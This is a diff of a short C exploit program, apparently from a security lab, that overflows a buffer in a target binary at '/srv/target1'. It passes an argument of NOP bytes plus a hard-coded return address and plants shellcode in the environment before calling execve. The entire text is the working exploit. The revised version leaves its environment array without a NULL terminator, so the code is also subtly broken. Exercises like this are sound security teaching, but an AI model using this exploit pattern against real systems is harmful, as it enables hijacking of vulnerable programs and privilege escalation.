@@ -7,31 +7,22 @@
 
 #define TARGET "/srv/target1"
 
-#define PADDING_SIZE 16
+#define PADDING_SIZE 8
 #define RETURN_ADDRESS 0xffffd719
 
-int main(void) {
-    char *args[3];
-    char *env[2];
+int main(void)
+{
+  char *args[3]; 
+  char *env[1];
+  
+  args[0] = TARGET;
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x19\xd7\xff\xff";
 
-    char padding[PADDING_SIZE];
-    memset(padding, '\x90', PADDING_SIZE);
+  args[2] = NULL;
+  
+  env[0] = shellcode;
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
 
-    char *malicious_buffer = (char *)malloc(PADDING_SIZE + 4);
-    memcpy(malicious_buffer, padding, PADDING_SIZE);
-    *(unsigned int *)(malicious_buffer + PADDING_SIZE) = RETURN_ADDRESS;
-
-    char shellcode_env[sizeof(shellcode) + 8];
-    sprintf(shellcode_env, "SHELL=%s", shellcode);
-
-    args[0] = TARGET;
-    args[1] = malicious_buffer;
-    args[2] = NULL;
-
-    env[0] = shellcode_env;
-    env[1] = NULL;
-
-    execve(TARGET, args, env);
-    fprintf(stderr, "execve failed.\n");
-    return 0;
+  return 0;
 }
